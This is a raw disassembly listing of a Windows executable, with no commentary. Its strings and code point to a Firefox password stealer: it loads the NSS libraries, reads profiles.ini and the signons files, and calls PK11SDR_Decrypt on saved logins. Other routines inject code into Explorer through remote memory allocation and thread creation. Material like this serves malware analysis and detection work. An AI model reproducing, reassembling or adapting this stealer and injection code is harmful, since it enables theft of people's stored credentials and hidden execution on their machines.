  40ab9f:	e8 1c 6f ff ff       	call   0x401ac0
  40aba4:	c3                   	ret
  40aba5:	e9 62 6c ff ff       	jmp    0x40180c
  40abaa:	eb c3                	jmp    0x40ab6f
  40abac:	5f                   	pop    %edi
  40abad:	5e                   	pop    %esi
  40abae:	5b                   	pop    %ebx
  40abaf:	8b e5                	mov    %ebp,%esp
  40abb1:	5d                   	pop    %ebp
  40abb2:	c3                   	ret
  40abb3:	00 ff                	add    %bh,%bh
  40abb5:	ff                   	(bad)
  40abb6:	ff                   	(bad)
  40abb7:	ff 03                	incl   (%ebx)
  40abb9:	00 00                	add    %al,(%eax)
  40abbb:	00 7c 7c 7c          	add    %bh,0x7c(%esp,%edi,2)
  40abbf:	00 ff                	add    %bh,%bh
  40abc1:	ff                   	(bad)
  40abc2:	ff                   	(bad)
  40abc3:	ff 11                	call   *(%ecx)
  40abc5:	00 00                	add    %al,(%eax)
  40abc7:	00 5c 4d 6f          	add    %bl,0x6f(%ebp,%ecx,2)
  40abcb:	7a 69                	jp     0x40ac36
  40abcd:	6c                   	insb   (%dx),%es:(%edi)
  40abce:	6c                   	insb   (%dx),%es:(%edi)
  40abcf:	61                   	popa
  40abd0:	20 46 69             	and    %al,0x69(%esi)
  40abd3:	72 65                	jb     0x40ac3a
  40abd5:	66 6f                	outsw  %ds:(%esi),(%dx)
  40abd7:	78 5c                	js     0x40ac35
  40abd9:	00 00                	add    %al,(%eax)
  40abdb:	00 ff                	add    %bh,%bh
  40abdd:	ff                   	(bad)
  40abde:	ff                   	(bad)
  40abdf:	ff 0c 00             	decl   (%eax,%eax,1)
  40abe2:	00 00                	add    %al,(%eax)
  40abe4:	6d                   	insl   (%dx),%es:(%edi)
  40abe5:	6f                   	outsl  %ds:(%esi),(%dx)
  40abe6:	7a 63                	jp     0x40ac4b
  40abe8:	72 74                	jb     0x40ac5e
  40abea:	31 39                	xor    %edi,(%ecx)
  40abec:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  40abef:	6c                   	insb   (%dx),%es:(%edi)
  40abf0:	00 00                	add    %al,(%eax)
  40abf2:	00 00                	add    %al,(%eax)
  40abf4:	ff                   	(bad)
  40abf5:	ff                   	(bad)
  40abf6:	ff                   	(bad)
  40abf7:	ff 0b                	decl   (%ebx)
  40abf9:	00 00                	add    %al,(%eax)
  40abfb:	00 73 71             	add    %dh,0x71(%ebx)
  40abfe:	6c                   	insb   (%dx),%es:(%edi)
  40abff:	69 74 65 33 2e 64 6c 	imul   $0x6c6c642e,0x33(%ebp,%eiz,2),%esi
  40ac06:	6c 
  40ac07:	00 ff                	add    %bh,%bh
  40ac09:	ff                   	(bad)
  40ac0a:	ff                   	(bad)
  40ac0b:	ff 09                	decl   (%ecx)
  40ac0d:	00 00                	add    %al,(%eax)
  40ac0f:	00 6e 73             	add    %ch,0x73(%esi)
  40ac12:	70 72                	jo     0x40ac86
  40ac14:	34 2e                	xor    $0x2e,%al
  40ac16:	64 6c                	fs insb (%dx),%es:(%edi)
  40ac18:	6c                   	insb   (%dx),%es:(%edi)
  40ac19:	00 00                	add    %al,(%eax)
  40ac1b:	00 ff                	add    %bh,%bh
  40ac1d:	ff                   	(bad)
  40ac1e:	ff                   	(bad)
  40ac1f:	ff 08                	decl   (%eax)
  40ac21:	00 00                	add    %al,(%eax)
  40ac23:	00 70 6c             	add    %dh,0x6c(%eax)
  40ac26:	63 34 2e             	arpl   %esi,(%esi,%ebp,1)
  40ac29:	64 6c                	fs insb (%dx),%es:(%edi)
  40ac2b:	6c                   	insb   (%dx),%es:(%edi)
  40ac2c:	00 00                	add    %al,(%eax)
  40ac2e:	00 00                	add    %al,(%eax)
  40ac30:	ff                   	(bad)
  40ac31:	ff                   	(bad)
  40ac32:	ff                   	(bad)
  40ac33:	ff 09                	decl   (%ecx)
  40ac35:	00 00                	add    %al,(%eax)
  40ac37:	00 70 6c             	add    %dh,0x6c(%eax)
  40ac3a:	64 73 34             	fs jae 0x40ac71
  40ac3d:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  40ac40:	6c                   	insb   (%dx),%es:(%edi)
  40ac41:	00 00                	add    %al,(%eax)
  40ac43:	00 ff                	add    %bh,%bh
  40ac45:	ff                   	(bad)
  40ac46:	ff                   	(bad)
  40ac47:	ff 0c 00             	decl   (%eax,%eax,1)
  40ac4a:	00 00                	add    %al,(%eax)
  40ac4c:	6e                   	outsb  %ds:(%esi),(%dx)
  40ac4d:	73 73                	jae    0x40acc2
  40ac4f:	75 74                	jne    0x40acc5
  40ac51:	69 6c 33 2e 64 6c 6c 	imul   $0x6c6c64,0x2e(%ebx,%esi,1),%ebp
  40ac58:	00 
  40ac59:	00 00                	add    %al,(%eax)
  40ac5b:	00 ff                	add    %bh,%bh
  40ac5d:	ff                   	(bad)
  40ac5e:	ff                   	(bad)
  40ac5f:	ff 0c 00             	decl   (%eax,%eax,1)
  40ac62:	00 00                	add    %al,(%eax)
  40ac64:	73 6f                	jae    0x40acd5
  40ac66:	66 74 6f             	data16 je 0x40acd8
  40ac69:	6b 6e 33 2e          	imul   $0x2e,0x33(%esi),%ebp
  40ac6d:	64 6c                	fs insb (%dx),%es:(%edi)
  40ac6f:	6c                   	insb   (%dx),%es:(%edi)
  40ac70:	00 00                	add    %al,(%eax)
  40ac72:	00 00                	add    %al,(%eax)
  40ac74:	ff                   	(bad)
  40ac75:	ff                   	(bad)
  40ac76:	ff                   	(bad)
  40ac77:	ff 08                	decl   (%eax)
  40ac79:	00 00                	add    %al,(%eax)
  40ac7b:	00 6e 73             	add    %ch,0x73(%esi)
  40ac7e:	73 33                	jae    0x40acb3
  40ac80:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  40ac83:	6c                   	insb   (%dx),%es:(%edi)
  40ac84:	00 00                	add    %al,(%eax)
  40ac86:	00 00                	add    %al,(%eax)
  40ac88:	4e                   	dec    %esi
  40ac89:	53                   	push   %ebx
  40ac8a:	53                   	push   %ebx
  40ac8b:	5f                   	pop    %edi
  40ac8c:	49                   	dec    %ecx
  40ac8d:	6e                   	outsb  %ds:(%esi),(%dx)
  40ac8e:	69 74 00 00 00 00 4e 	imul   $0x534e0000,0x0(%eax,%eax,1),%esi
  40ac95:	53 
  40ac96:	53                   	push   %ebx
  40ac97:	42                   	inc    %edx
  40ac98:	61                   	popa
  40ac99:	73 65                	jae    0x40ad00
  40ac9b:	36 34 5f             	ss xor $0x5f,%al
  40ac9e:	44                   	inc    %esp
  40ac9f:	65 63 6f 64          	arpl   %ebp,%gs:0x64(%edi)
  40aca3:	65 42                	gs inc %edx
  40aca5:	75 66                	jne    0x40ad0d
  40aca7:	66 65 72 00          	data16 gs jb 0x40acab
  40acab:	00 50 4b             	add    %dl,0x4b(%eax)
  40acae:	31 31                	xor    %esi,(%ecx)
  40acb0:	5f                   	pop    %edi
  40acb1:	47                   	inc    %edi
  40acb2:	65 74 49             	gs je  0x40acfe
  40acb5:	6e                   	outsb  %ds:(%esi),(%dx)
  40acb6:	74 65                	je     0x40ad1d
  40acb8:	72 6e                	jb     0x40ad28
  40acba:	61                   	popa
  40acbb:	6c                   	insb   (%dx),%es:(%edi)
  40acbc:	4b                   	dec    %ebx
  40acbd:	65 79 53             	gs jns 0x40ad13
  40acc0:	6c                   	insb   (%dx),%es:(%edi)
  40acc1:	6f                   	outsl  %ds:(%esi),(%dx)
  40acc2:	74 00                	je     0x40acc4
  40acc4:	50                   	push   %eax
  40acc5:	4b                   	dec    %ebx
  40acc6:	31 31                	xor    %esi,(%ecx)
  40acc8:	5f                   	pop    %edi
  40acc9:	41                   	inc    %ecx
  40acca:	75 74                	jne    0x40ad40
  40accc:	68 65 6e 74 69       	push   $0x69746e65
  40acd1:	63 61 74             	arpl   %esp,0x74(%ecx)
  40acd4:	65 00 00             	add    %al,%gs:(%eax)
  40acd7:	00 50 4b             	add    %dl,0x4b(%eax)
  40acda:	31 31                	xor    %esi,(%ecx)
  40acdc:	53                   	push   %ebx
  40acdd:	44                   	inc    %esp
  40acde:	52                   	push   %edx
  40acdf:	5f                   	pop    %edi
  40ace0:	44                   	inc    %esp
  40ace1:	65 63 72 79          	arpl   %esi,%gs:0x79(%edx)
  40ace5:	70 74                	jo     0x40ad5b
  40ace7:	00 4e 53             	add    %cl,0x53(%esi)
  40acea:	53                   	push   %ebx
  40aceb:	5f                   	pop    %edi
  40acec:	53                   	push   %ebx
  40aced:	68 75 74 64 6f       	push   $0x6f647475
  40acf2:	77 6e                	ja     0x40ad62
  40acf4:	00 00                	add    %al,(%eax)
  40acf6:	00 00                	add    %al,(%eax)
  40acf8:	50                   	push   %eax
  40acf9:	4b                   	dec    %ebx
  40acfa:	31 31                	xor    %esi,(%ecx)
  40acfc:	5f                   	pop    %edi
  40acfd:	46                   	inc    %esi
  40acfe:	72 65                	jb     0x40ad65
  40ad00:	65 53                	gs push %ebx
  40ad02:	6c                   	insb   (%dx),%es:(%edi)
  40ad03:	6f                   	outsl  %ds:(%esi),(%dx)
  40ad04:	74 00                	je     0x40ad06
  40ad06:	00 00                	add    %al,(%eax)
  40ad08:	75 73                	jne    0x40ad7d
  40ad0a:	65 72 65             	gs jb  0x40ad72
  40ad0d:	6e                   	outsb  %ds:(%esi),(%dx)
  40ad0e:	76 2e                	jbe    0x40ad3e
  40ad10:	64 6c                	fs insb (%dx),%es:(%edi)
  40ad12:	6c                   	insb   (%dx),%es:(%edi)
  40ad13:	00 47 65             	add    %al,0x65(%edi)
  40ad16:	74 55                	je     0x40ad6d
  40ad18:	73 65                	jae    0x40ad7f
  40ad1a:	72 50                	jb     0x40ad6c
  40ad1c:	72 6f                	jb     0x40ad8d
  40ad1e:	66 69 6c 65 44 69 72 	imul   $0x7269,0x44(%ebp,%eiz,2),%bp
  40ad25:	65 63 74 6f 72       	arpl   %esi,%gs:0x72(%edi,%ebp,2)
  40ad2a:	79 41                	jns    0x40ad6d
  40ad2c:	00 00                	add    %al,(%eax)
  40ad2e:	00 00                	add    %al,(%eax)
  40ad30:	ff                   	(bad)
  40ad31:	ff                   	(bad)
  40ad32:	ff                   	(bad)
  40ad33:	ff 11                	call   *(%ecx)
  40ad35:	00 00                	add    %al,(%eax)
  40ad37:	00 5c 4d 6f          	add    %bl,0x6f(%ebp,%ecx,2)
  40ad3b:	7a 69                	jp     0x40ada6
  40ad3d:	6c                   	insb   (%dx),%es:(%edi)
  40ad3e:	6c                   	insb   (%dx),%es:(%edi)
  40ad3f:	61                   	popa
  40ad40:	5c                   	pop    %esp
  40ad41:	46                   	inc    %esi
  40ad42:	69 72 65 66 6f 78 5c 	imul   $0x5c786f66,0x65(%edx),%esi
  40ad49:	00 00                	add    %al,(%eax)
  40ad4b:	00 ff                	add    %bh,%bh
  40ad4d:	ff                   	(bad)
  40ad4e:	ff                   	(bad)
  40ad4f:	ff 0c 00             	decl   (%eax,%eax,1)
  40ad52:	00 00                	add    %al,(%eax)
  40ad54:	70 72                	jo     0x40adc8
  40ad56:	6f                   	outsl  %ds:(%esi),(%dx)
  40ad57:	66 69 6c 65 73 2e 69 	imul   $0x692e,0x73(%ebp,%eiz,2),%bp
  40ad5e:	6e                   	outsb  %ds:(%esi),(%dx)
  40ad5f:	69 00 00 00 00 00    	imul   $0x0,(%eax),%eax
  40ad65:	00 00                	add    %al,(%eax)
  40ad67:	00 50 61             	add    %dl,0x61(%eax)
  40ad6a:	74 68                	je     0x40add4
  40ad6c:	00 00                	add    %al,(%eax)
  40ad6e:	00 00                	add    %al,(%eax)
  40ad70:	50                   	push   %eax
  40ad71:	72 6f                	jb     0x40ade2
  40ad73:	66 69 6c 65 30 00 00 	imul   $0x0,0x30(%ebp,%eiz,2),%bp
  40ad7a:	00 00                	add    %al,(%eax)
  40ad7c:	ff                   	(bad)
  40ad7d:	ff                   	(bad)
  40ad7e:	ff                   	(bad)
  40ad7f:	ff 0d 00 00 00 5c    	decl   0x5c000000
  40ad85:	73 69                	jae    0x40adf0
  40ad87:	67 6e                	outsb  %ds:(%si),(%dx)
  40ad89:	6f                   	outsl  %ds:(%esi),(%dx)
  40ad8a:	6e                   	outsb  %ds:(%esi),(%dx)
  40ad8b:	73 33                	jae    0x40adc0
  40ad8d:	2e 74 78             	je,pn  0x40ae08
  40ad90:	74 00                	je     0x40ad92
  40ad92:	00 00                	add    %al,(%eax)
  40ad94:	ff                   	(bad)
  40ad95:	ff                   	(bad)
  40ad96:	ff                   	(bad)
  40ad97:	ff 0d 00 00 00 5c    	decl   0x5c000000
  40ad9d:	73 69                	jae    0x40ae08
  40ad9f:	67 6e                	outsb  %ds:(%si),(%dx)
  40ada1:	6f                   	outsl  %ds:(%esi),(%dx)
  40ada2:	6e                   	outsb  %ds:(%esi),(%dx)
  40ada3:	73 32                	jae    0x40add7
  40ada5:	2e 74 78             	je,pn  0x40ae20
  40ada8:	74 00                	je     0x40adaa
  40adaa:	00 00                	add    %al,(%eax)
  40adac:	ff                   	(bad)
  40adad:	ff                   	(bad)
  40adae:	ff                   	(bad)
  40adaf:	ff 0d 00 00 00 5c    	decl   0x5c000000
  40adb5:	73 69                	jae    0x40ae20
  40adb7:	67 6e                	outsb  %ds:(%si),(%dx)
  40adb9:	6f                   	outsl  %ds:(%esi),(%dx)
  40adba:	6e                   	outsb  %ds:(%esi),(%dx)
  40adbb:	73 31                	jae    0x40adee
  40adbd:	2e 74 78             	je,pn  0x40ae38
  40adc0:	74 00                	je     0x40adc2
  40adc2:	00 00                	add    %al,(%eax)
  40adc4:	ff                   	(bad)
  40adc5:	ff                   	(bad)
  40adc6:	ff                   	(bad)
  40adc7:	ff 0c 00             	decl   (%eax,%eax,1)
  40adca:	00 00                	add    %al,(%eax)
  40adcc:	5c                   	pop    %esp
  40adcd:	73 69                	jae    0x40ae38
  40adcf:	67 6e                	outsb  %ds:(%si),(%dx)
  40add1:	6f                   	outsl  %ds:(%esi),(%dx)
  40add2:	6e                   	outsb  %ds:(%esi),(%dx)
  40add3:	73 2e                	jae    0x40ae03
  40add5:	74 78                	je     0x40ae4f
  40add7:	74 00                	je     0x40add9
  40add9:	00 00                	add    %al,(%eax)
  40addb:	00 ff                	add    %bh,%bh
  40addd:	ff                   	(bad)
  40adde:	ff                   	(bad)
  40addf:	ff 03                	incl   (%ebx)
  40ade1:	00 00                	add    %al,(%eax)
  40ade3:	00 2e                	add    %ch,(%esi)
  40ade5:	0d 0a 00 ff ff       	or     $0xffff000a,%eax
  40adea:	ff                   	(bad)
  40adeb:	ff 02                	incl   (%edx)
  40aded:	00 00                	add    %al,(%eax)
  40adef:	00 0d 0a 00 00 ff    	add    %cl,0xff00000a
  40adf5:	ff                   	(bad)
  40adf6:	ff                   	(bad)
  40adf7:	ff 04 00             	incl   (%eax,%eax,1)
  40adfa:	00 00                	add    %al,(%eax)
  40adfc:	23 23                	and    (%ebx),%esp
  40adfe:	24 24                	and    $0x24,%al
  40ae00:	00 00                	add    %al,(%eax)
  40ae02:	00 00                	add    %al,(%eax)
  40ae04:	ff                   	(bad)
  40ae05:	ff                   	(bad)
  40ae06:	ff                   	(bad)
  40ae07:	ff 01                	incl   (%ecx)
  40ae09:	00 00                	add    %al,(%eax)
  40ae0b:	00 7c 00 00          	add    %bh,0x0(%eax,%eax,1)
  40ae0f:	00 ff                	add    %bh,%bh
  40ae11:	ff                   	(bad)
  40ae12:	ff                   	(bad)
  40ae13:	ff 0f                	decl   (%edi)
  40ae15:	00 00                	add    %al,(%eax)
  40ae17:	00 28                	add    %ch,(%eax)
  40ae19:	75 6e                	jne    0x40ae89
  40ae1b:	6e                   	outsb  %ds:(%esi),(%dx)
  40ae1c:	61                   	popa
  40ae1d:	6d                   	insl   (%dx),%es:(%edi)
  40ae1e:	65 64 20 76 61       	gs and %dh,%fs:0x61(%esi)
  40ae23:	6c                   	insb   (%dx),%es:(%edi)
  40ae24:	75 65                	jne    0x40ae8b
  40ae26:	29 00                	sub    %eax,(%eax)
  40ae28:	ff                   	(bad)
  40ae29:	ff                   	(bad)
  40ae2a:	ff                   	(bad)
  40ae2b:	ff 12                	call   *(%edx)
  40ae2d:	00 00                	add    %al,(%eax)
  40ae2f:	00 28                	add    %ch,(%eax)
  40ae31:	75 6e                	jne    0x40aea1
  40ae33:	6e                   	outsb  %ds:(%esi),(%dx)
  40ae34:	61                   	popa
  40ae35:	6d                   	insl   (%dx),%es:(%edi)
  40ae36:	65 64 20 70 61       	gs and %dh,%fs:0x61(%eax)
  40ae3b:	73 73                	jae    0x40aeb0
  40ae3d:	77 6f                	ja     0x40aeae
  40ae3f:	72 64                	jb     0x40aea5
  40ae41:	29 00                	sub    %eax,(%eax)
  40ae43:	00 ff                	add    %bh,%bh
  40ae45:	ff                   	(bad)
  40ae46:	ff                   	(bad)
  40ae47:	ff 01                	incl   (%ecx)
  40ae49:	00 00                	add    %al,(%eax)
  40ae4b:	00 20                	add    %ah,(%eax)
  40ae4d:	00 00                	add    %al,(%eax)
  40ae4f:	00 55 8b             	add    %dl,-0x75(%ebp)
  40ae52:	ec                   	in     (%dx),%al
  40ae53:	33 c0                	xor    %eax,%eax
  40ae55:	55                   	push   %ebp
  40ae56:	68 81 ae 40 00       	push   $0x40ae81
  40ae5b:	64 ff 30             	push   %fs:(%eax)
  40ae5e:	64 89 20             	mov    %esp,%fs:(%eax)
  40ae61:	ff 05 d8 f1 40 00    	incl   0x40f1d8
  40ae67:	75 0a                	jne    0x40ae73
  40ae69:	b8 d4 f1 40 00       	mov    $0x40f1d4,%eax
  40ae6e:	e8 4d 6c ff ff       	call   0x401ac0
  40ae73:	33 c0                	xor    %eax,%eax
  40ae75:	5a                   	pop    %edx
  40ae76:	59                   	pop    %ecx
  40ae77:	59                   	pop    %ecx
  40ae78:	64 89 10             	mov    %edx,%fs:(%eax)
  40ae7b:	68 88 ae 40 00       	push   $0x40ae88
  40ae80:	c3                   	ret
  40ae81:	e9 86 69 ff ff       	jmp    0x40180c
  40ae86:	eb f8                	jmp    0x40ae80
  40ae88:	5d                   	pop    %ebp
  40ae89:	c3                   	ret
  40ae8a:	8b c0                	mov    %eax,%eax
  40ae8c:	83 2d d8 f1 40 00 01 	subl   $0x1,0x40f1d8
  40ae93:	c3                   	ret
  40ae94:	55                   	push   %ebp
  40ae95:	8b ec                	mov    %esp,%ebp
  40ae97:	53                   	push   %ebx
  40ae98:	8b 5d 08             	mov    0x8(%ebp),%ebx
  40ae9b:	eb 07                	jmp    0x40aea4
  40ae9d:	6a 64                	push   $0x64
  40ae9f:	e8 d4 87 ff ff       	call   0x403678
  40aea4:	8b 03                	mov    (%ebx),%eax
  40aea6:	50                   	push   %eax
  40aea7:	e8 ec 86 ff ff       	call   0x403598
  40aeac:	83 f8 01             	cmp    $0x1,%eax
  40aeaf:	1b c0                	sbb    %eax,%eax
  40aeb1:	40                   	inc    %eax
  40aeb2:	84 c0                	test   %al,%al
  40aeb4:	74 e7                	je     0x40ae9d
  40aeb6:	5b                   	pop    %ebx
  40aeb7:	5d                   	pop    %ebp
  40aeb8:	c2 04 00             	ret    $0x4
  40aebb:	90                   	nop
  40aebc:	53                   	push   %ebx
  40aebd:	56                   	push   %esi
  40aebe:	57                   	push   %edi
  40aebf:	55                   	push   %ebp
  40aec0:	83 c4 f8             	add    $0xfffffff8,%esp
  40aec3:	8b f9                	mov    %ecx,%edi
  40aec5:	8b ea                	mov    %edx,%ebp
  40aec7:	8b f0                	mov    %eax,%esi
  40aec9:	6a 40                	push   $0x40
  40aecb:	68 00 30 00 00       	push   $0x3000
  40aed0:	57                   	push   %edi
  40aed1:	6a 00                	push   $0x0
  40aed3:	56                   	push   %esi
  40aed4:	e8 af 87 ff ff       	call   0x403688
  40aed9:	8b d8                	mov    %eax,%ebx
  40aedb:	8d 44 24 04          	lea    0x4(%esp),%eax
  40aedf:	50                   	push   %eax
  40aee0:	6a 40                	push   $0x40
  40aee2:	57                   	push   %edi
  40aee3:	53                   	push   %ebx
  40aee4:	56                   	push   %esi
  40aee5:	e8 be 87 ff ff       	call   0x4036a8
  40aeea:	85 db                	test   %ebx,%ebx
  40aeec:	74 10                	je     0x40aefe
  40aeee:	54                   	push   %esp
  40aeef:	57                   	push   %edi
  40aef0:	55                   	push   %ebp
  40aef1:	53                   	push   %ebx
  40aef2:	56                   	push   %esi
  40aef3:	e8 c8 87 ff ff       	call   0x4036c0
  40aef8:	85 c0                	test   %eax,%eax
  40aefa:	75 02                	jne    0x40aefe
  40aefc:	33 db                	xor    %ebx,%ebx
  40aefe:	8b c3                	mov    %ebx,%eax
  40af00:	59                   	pop    %ecx
  40af01:	5a                   	pop    %edx
  40af02:	5d                   	pop    %ebp
  40af03:	5f                   	pop    %edi
  40af04:	5e                   	pop    %esi
  40af05:	5b                   	pop    %ebx
  40af06:	c3                   	ret
  40af07:	90                   	nop
  40af08:	53                   	push   %ebx
  40af09:	56                   	push   %esi
  40af0a:	57                   	push   %edi
  40af0b:	55                   	push   %ebp
  40af0c:	83 c4 ec             	add    $0xffffffec,%esp
  40af0f:	89 4c 24 04          	mov    %ecx,0x4(%esp)
  40af13:	89 14 24             	mov    %edx,(%esp)
  40af16:	8b d8                	mov    %eax,%ebx
  40af18:	33 c0                	xor    %eax,%eax
  40af1a:	89 44 24 08          	mov    %eax,0x8(%esp)
  40af1e:	6a 00                	push   $0x0
  40af20:	e8 d3 86 ff ff       	call   0x4035f8
  40af25:	8b c8                	mov    %eax,%ecx
  40af27:	8b c1                	mov    %ecx,%eax
  40af29:	33 d2                	xor    %edx,%edx
  40af2b:	52                   	push   %edx
  40af2c:	50                   	push   %eax
  40af2d:	8b 41 3c             	mov    0x3c(%ecx),%eax
  40af30:	99                   	cltd
  40af31:	03 04 24             	add    (%esp),%eax
  40af34:	13 54 24 04          	adc    0x4(%esp),%edx
  40af38:	83 c4 08             	add    $0x8,%esp
  40af3b:	8b 70 50             	mov    0x50(%eax),%esi
  40af3e:	8b 78 34             	mov    0x34(%eax),%edi
  40af41:	68 00 80 00 00       	push   $0x8000
  40af46:	6a 00                	push   $0x0
  40af48:	57                   	push   %edi
  40af49:	53                   	push   %ebx
  40af4a:	e8 49 87 ff ff       	call   0x403698
  40af4f:	6a 40                	push   $0x40
  40af51:	68 00 30 00 00       	push   $0x3000
  40af56:	56                   	push   %esi
  40af57:	57                   	push   %edi
  40af58:	53                   	push   %ebx
  40af59:	e8 2a 87 ff ff       	call   0x403688
  40af5e:	8b e8                	mov    %eax,%ebp
  40af60:	85 ed                	test   %ebp,%ebp
  40af62:	74 40                	je     0x40afa4
  40af64:	8d 44 24 0c          	lea    0xc(%esp),%eax
  40af68:	50                   	push   %eax
  40af69:	56                   	push   %esi
  40af6a:	6a 00                	push   $0x0
  40af6c:	e8 87 86 ff ff       	call   0x4035f8
  40af71:	50                   	push   %eax
  40af72:	57                   	push   %edi
  40af73:	53                   	push   %ebx
  40af74:	e8 47 87 ff ff       	call   0x4036c0
  40af79:	3b 74 24 0c          	cmp    0xc(%esp),%esi
  40af7d:	77 25                	ja     0x40afa4
  40af7f:	8d 44 24 10          	lea    0x10(%esp),%eax
  40af83:	50                   	push   %eax
  40af84:	6a 00                	push   $0x0
  40af86:	8b 44 24 0c          	mov    0xc(%esp),%eax
  40af8a:	50                   	push   %eax
  40af8b:	8b 44 24 0c          	mov    0xc(%esp),%eax
  40af8f:	50                   	push   %eax
  40af90:	6a 00                	push   $0x0
  40af92:	6a 00                	push   $0x0
  40af94:	53                   	push   %ebx
  40af95:	e8 f6 85 ff ff       	call   0x403590
  40af9a:	53                   	push   %ebx
  40af9b:	e8 98 85 ff ff       	call   0x403538
  40afa0:	89 6c 24 08          	mov    %ebp,0x8(%esp)
  40afa4:	8b 44 24 08          	mov    0x8(%esp),%eax
  40afa8:	83 c4 14             	add    $0x14,%esp
  40afab:	5d                   	pop    %ebp
  40afac:	5f                   	pop    %edi
  40afad:	5e                   	pop    %esi
  40afae:	5b                   	pop    %ebx
  40afaf:	c3                   	ret
  40afb0:	55                   	push   %ebp
  40afb1:	8b ec                	mov    %esp,%ebp
  40afb3:	83 c4 f0             	add    $0xfffffff0,%esp
  40afb6:	53                   	push   %ebx
  40afb7:	56                   	push   %esi
  40afb8:	33 c0                	xor    %eax,%eax
  40afba:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40afbd:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40afc0:	33 c0                	xor    %eax,%eax
  40afc2:	55                   	push   %ebp
  40afc3:	68 62 b0 40 00       	push   $0x40b062
  40afc8:	64 ff 30             	push   %fs:(%eax)
  40afcb:	64 89 20             	mov    %esp,%fs:(%eax)
  40afce:	8d 55 f4             	lea    -0xc(%ebp),%edx
  40afd1:	33 c0                	xor    %eax,%eax
  40afd3:	e8 cc 63 ff ff       	call   0x4013a4
  40afd8:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40afdb:	e8 68 6f ff ff       	call   0x401f48
  40afe0:	8b f0                	mov    %eax,%esi
  40afe2:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40afe5:	50                   	push   %eax
  40afe6:	6a 00                	push   $0x0
  40afe8:	68 70 b0 40 00       	push   $0x40b070
  40afed:	e8 fe 86 ff ff       	call   0x4036f0
  40aff2:	50                   	push   %eax
  40aff3:	e8 08 87 ff ff       	call   0x403700
  40aff8:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40affb:	50                   	push   %eax
  40affc:	6a 00                	push   $0x0
  40affe:	68 ff 0f 1f 00       	push   $0x1f0fff
  40b003:	e8 40 86 ff ff       	call   0x403648
  40b008:	8b d8                	mov    %eax,%ebx
  40b00a:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40b00d:	8b d6                	mov    %esi,%edx
  40b00f:	e8 98 6c ff ff       	call   0x401cac
  40b014:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40b017:	e8 34 6d ff ff       	call   0x401d50
  40b01c:	8b c8                	mov    %eax,%ecx
  40b01e:	8b d6                	mov    %esi,%edx
  40b020:	8b c3                	mov    %ebx,%eax
  40b022:	e8 95 fe ff ff       	call   0x40aebc
  40b027:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40b02a:	8d 55 f8             	lea    -0x8(%ebp),%edx
  40b02d:	b9 04 00 00 00       	mov    $0x4,%ecx
  40b032:	8b c3                	mov    %ebx,%eax
  40b034:	e8 83 fe ff ff       	call   0x40aebc
  40b039:	ba 94 ae 40 00       	mov    $0x40ae94,%edx
  40b03e:	8b c8                	mov    %eax,%ecx
  40b040:	8b c3                	mov    %ebx,%eax
  40b042:	e8 c1 fe ff ff       	call   0x40af08
  40b047:	33 c0                	xor    %eax,%eax
  40b049:	5a                   	pop    %edx
  40b04a:	59                   	pop    %ecx
  40b04b:	59                   	pop    %ecx
  40b04c:	64 89 10             	mov    %edx,%fs:(%eax)
  40b04f:	68 69 b0 40 00       	push   $0x40b069
  40b054:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40b057:	ba 02 00 00 00       	mov    $0x2,%edx
  40b05c:	e8 83 6a ff ff       	call   0x401ae4
  40b061:	c3                   	ret
  40b062:	e9 a5 67 ff ff       	jmp    0x40180c
  40b067:	eb eb                	jmp    0x40b054
  40b069:	5e                   	pop    %esi
  40b06a:	5b                   	pop    %ebx
  40b06b:	8b e5                	mov    %ebp,%esp
  40b06d:	5d                   	pop    %ebp
  40b06e:	c3                   	ret
  40b06f:	00 53 68             	add    %dl,0x68(%ebx)
  40b072:	65 6c                	gs insb (%dx),%es:(%edi)
  40b074:	6c                   	insb   (%dx),%es:(%edi)
  40b075:	5f                   	pop    %edi
  40b076:	54                   	push   %esp
  40b077:	72 61                	jb     0x40b0da
  40b079:	79 57                	jns    0x40b0d2
  40b07b:	6e                   	outsb  %ds:(%esi),(%dx)
  40b07c:	64 00 00             	add    %al,%fs:(%eax)
  40b07f:	00 55 8b             	add    %dl,-0x75(%ebp)
  40b082:	ec                   	in     (%dx),%al
  40b083:	33 c0                	xor    %eax,%eax
  40b085:	55                   	push   %ebp
  40b086:	68 a5 b0 40 00       	push   $0x40b0a5
  40b08b:	64 ff 30             	push   %fs:(%eax)
  40b08e:	64 89 20             	mov    %esp,%fs:(%eax)
  40b091:	ff 05 e4 f1 40 00    	incl   0x40f1e4
  40b097:	33 c0                	xor    %eax,%eax
  40b099:	5a                   	pop    %edx
  40b09a:	59                   	pop    %ecx
  40b09b:	59                   	pop    %ecx
  40b09c:	64 89 10             	mov    %edx,%fs:(%eax)
  40b09f:	68 ac b0 40 00       	push   $0x40b0ac
  40b0a4:	c3                   	ret
  40b0a5:	e9 62 67 ff ff       	jmp    0x40180c
  40b0aa:	eb f8                	jmp    0x40b0a4
  40b0ac:	5d                   	pop    %ebp
  40b0ad:	c3                   	ret
  40b0ae:	8b c0                	mov    %eax,%eax
  40b0b0:	83 2d e4 f1 40 00 01 	subl   $0x1,0x40f1e4
  40b0b7:	c3                   	ret
  40b0b8:	55                   	push   %ebp
  40b0b9:	8b ec                	mov    %esp,%ebp
  40b0bb:	81 c4 f8 fe ff ff    	add    $0xfffffef8,%esp
  40b0c1:	53                   	push   %ebx
  40b0c2:	56                   	push   %esi
  40b0c3:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  40b0c6:	be 01 00 00 00       	mov    $0x1,%esi
  40b0cb:	8b 5d fc             	mov    -0x4(%ebp),%ebx
  40b0ce:	81 ea 00 01 00 00    	sub    $0x100,%edx
  40b0d4:	75 27                	jne    0x40b0fd
  40b0d6:	8d 85 fa fe ff ff    	lea    -0x106(%ebp),%eax
  40b0dc:	50                   	push   %eax
  40b0dd:	e8 16 86 ff ff       	call   0x4036f8
  40b0e2:	6a 00                	push   $0x0
  40b0e4:	8d 45 fa             	lea    -0x6(%ebp),%eax
